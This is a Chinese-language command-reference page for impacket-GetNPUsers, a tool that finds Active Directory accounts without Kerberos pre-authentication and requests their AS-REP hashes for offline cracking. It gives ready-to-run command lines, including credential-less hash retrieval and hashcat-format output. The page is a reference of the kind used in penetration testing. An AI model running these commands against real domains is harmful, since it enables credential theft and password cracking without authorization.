# TAGLINE

查找设置了"不要求 Kerberos 预身份验证"的 Active Directory 用户

# TLDR

从用户文件中**查找可被 AS-REP Roasting 的用户**

```impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -usersfile [users.txt]```

无需凭据**获取特定用户的哈希**

```impacket-GetNPUsers [domain]/[user] -dc-ip [dc-ip] -no-pass```

以 hashcat 格式**请求哈希**并保存到文件

```impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -usersfile [users.txt] -format hashcat -outputfile [hashes.txt]```

使用凭据**通过 LDAP 枚举**

```impacket-GetNPUsers [domain]/[user]:[password] -dc-ip [dc-ip] -request```

使用 ccache 中的 **Kerberos 身份验证**

```impacket-GetNPUsers [domain]/[user] -dc-ip [dc-ip] -k -no-pass```

# SYNOPSIS

**impacket-GetNPUsers** [_options_] _target_

# PARAMETERS

**-dc-ip** _ip_
> 域控制器 IP 地址。

**-usersfile** _file_
> 包含待测试用户名的文件（每行一个）。

**-no-pass**
> 不询问密码（与 -k 或匿名查询搭配时有用）。

**-request**
> 为存在漏洞的用户请求 TGT 哈希（默认：仅列出这些用户）。

**-format** _type_
> 哈希输出格式：hashcat 或 john（默认：hashcat）。

**-outputfile** _file_
> 将哈希保存到文件而不是 stdout。

**-k**
> 使用 ccache（KRB5CCNAME）中的 Kerberos 身份验证。

**-hashes** _LMHASH:NTHASH_
> 使用 NTLM 哈希而非密码进行身份验证。

**-aesKey** _KEY_
> 用于 Kerberos 身份验证的 AES 密钥。

**-ts**
> 在日志输出中添加时间戳。

**-debug**
> 开启调试输出。

# DESCRIPTION

**impacket-GetNPUsers** 列出 Active Directory 中设置了"不要求 Kerberos 预身份验证"（UF_DONT_REQUIRE_PREAUTH）的用户，并为其请求 TGT。这使得 AS-REP Roasting 成为可能：获取的哈希可以用 hashcat 或 John the Ripper 进行离线破解。

不带 **-usersfile** 时，脚本会查询 LDAP 自动枚举存在漏洞的账户（需要有效凭据）。带 **-usersfile** 时，它会逐个测试用户名，而无需域凭据。属于 Impacket 工具集。仅限用于经授权的安全测试。

# INSTALL

```pacman: sudo pacman -S impacket```

<!-- packages: 2026-07-22 -->

# SEE ALSO

[impacket-getuserspns](/man/impacket-getuserspns)(1), [hashcat](/man/hashcat)(1)
